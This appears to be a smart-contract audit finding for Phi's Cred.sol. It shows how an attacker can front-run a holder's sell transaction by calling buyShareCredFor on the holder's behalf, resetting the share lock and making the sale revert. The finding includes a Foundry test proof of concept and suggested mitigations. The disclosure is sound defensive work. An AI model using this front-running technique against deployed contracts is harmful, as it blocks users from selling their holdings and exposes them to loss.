# Vulnerability details

The system is exposing two functions to buy shares `buyShareCred` and `buyShareCredFor`. Also there is a `SHARE_LOCK_PERIOD` that increment the `lastTradeTimestamp` variable each time that you buy and does not let you sell  until the `SHARE_LOCK_PERIOD` has passed.

```solidity

   if (isBuy) {
            if (priceLimit != 0 && price + protocolFee + creatorFee > priceLimit) revert PriceExceedsLimit();
            if (supply + amount_ > MAX_SUPPLY) {
                revert MaxSupplyReached();
            }

            if (msg.value < price + protocolFee + creatorFee) {
                revert InsufficientPayment();
            }
        } else {
            if (priceLimit != 0 && price - protocolFee - creatorFee < priceLimit) revert PriceBelowLimit();
            if (block.timestamp <= lastTradeTimestamp[credId_][curator_] + SHARE_LOCK_PERIOD) {
                revert ShareLockPeriodNotPassed(
                    block.timestamp, lastTradeTimestamp[credId_][curator_] + SHARE_LOCK_PERIOD <-----------
                );
            }


```
[[Link]](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/Cred.sol#L614C6-L629C14).

In the arrow below we can see the check for the `SHARE_LOCK_PERIOD `.

With that being say see the next scenario:


1. Honest user already wait his `SHARE_LOCK_PERIOD ` and he decide sell a portion of his shares.
2. Honest user sent the `sellShareCred` tx to sell his shares.
3. Attacker see this tx coming and immediately call the `buyShareCredFor` buying just i wei of shares to the honest user.
4. Honest tx user revert because the `lastTradeTimestamp`  is been aumented, 




## Impact
Attacker can DoS  anyone trying to sell shares in `cred.sol` contract

## Proof of Concept
Run the next Proof of concept in `file: test/cred.t.sol`:

```solidity

  function test_SellAction_DoS() public {
        _createCred("BASIC", "SIGNATURE", 0x0);
        vm.startPrank(anyone);
        uint256 buyPrice = bondingCurve.getBuyPriceAfterFee(1, 1, 1);
        uint256 maxPrice = bondingCurve.getBuyPriceAfterFee(1, 1, 2);

        cred.buyShareCred{ value: buyPrice }(1, 1, maxPrice);
        assertEq(cred.isShareHolder(1, anyone), true, "cred 1 is voted by anyone");
        vm.warp(block.timestamp + 10 minutes + 1 seconds);

        vm.stopPrank();

        address attacker = address(12);
        vm.deal(attacker, 1 ether);
        vm.prank(attacker);
        cred.buyShareCredFor{ value: buyPrice * 2 }(1, 1, anyone, maxPrice * 2);

        vm.startPrank(anyone);
        uint256 minPrice = bondingCurve.getSellPriceAfterFee(1, 1, 1);
        vm.expectRevert();
        cred.sellShareCred(1, 1, minPrice);
        vm.stopPrank();
    }

```

## Tools Used
Manual, foundry

## Recommended Mitigation Steps
My first recommendation will be create a minimum amount of share to buy, then attacker have to spend more money to execute the attacker, and probably will be not worth it.

The second recommendation is eliminate complete the `buyShareCredFor` function
